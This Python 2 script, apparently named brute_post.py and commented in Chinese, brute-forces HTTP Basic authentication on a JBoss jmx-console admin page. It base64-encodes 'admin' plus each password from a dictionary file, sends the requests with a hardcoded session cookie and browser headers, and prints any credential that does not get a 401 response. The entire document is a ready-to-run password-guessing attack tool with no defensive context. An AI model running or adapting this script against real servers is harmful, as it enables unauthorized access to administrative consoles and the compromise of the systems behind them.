#!/usr/bin/env python    
#-*- coding:utf8 -*-

import urllib
import urllib2
import base64
import time
import sys
import requests
import getopt

senddatas = []
dict_file = ""
senddata = ""


def usage():
	print "python brute_post.py -f dict.txt"
	sys.exit(0)

#从字典中读取密码
def get_password(dict_file):
	password = ""
	with open(dict_file,"r") as passwords:
		for password in passwords.readlines():
			password = password.strip()
			password = password.strip("\n")
			password = "admin:"+password
			password = base64.b64encode(password)
			senddatas.append(password)
	return senddatas

#requests发包
def request_post(dict_file):
	requrl = "http://www.xxoo.com/jmx-console/"
	senddatas = get_password(dict_file)
	for senddata in senddatas:
	    headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0","Accept":"application/json, text/javascript, */*; q=0.01","Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2","Accept-Encoding":"gzip, deflate","Cookie":"JSESSIONID=B6D00052711B5D5778F3487DE79A87EC","Connection":"keep-alive","Authorization":"Basic "+senddata}
	    request = requests.get(requrl, headers = headers)
	    if request.status_code != 401:
	        print senddata
	    time.sleep(1)


def main():
	global dict_file

	try:
		opts,args = getopt.getopt(sys.argv[1:],"hf:",["help","dictfile"])
	except getopt.GetoptError as err:
		print str(err)
		sys.exit(0)
	for o,a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in ("-f","--dictfile"):
			dict_file = a
		else:
			assert False,"Unhandled Option"

	request_post(dict_file)

main()
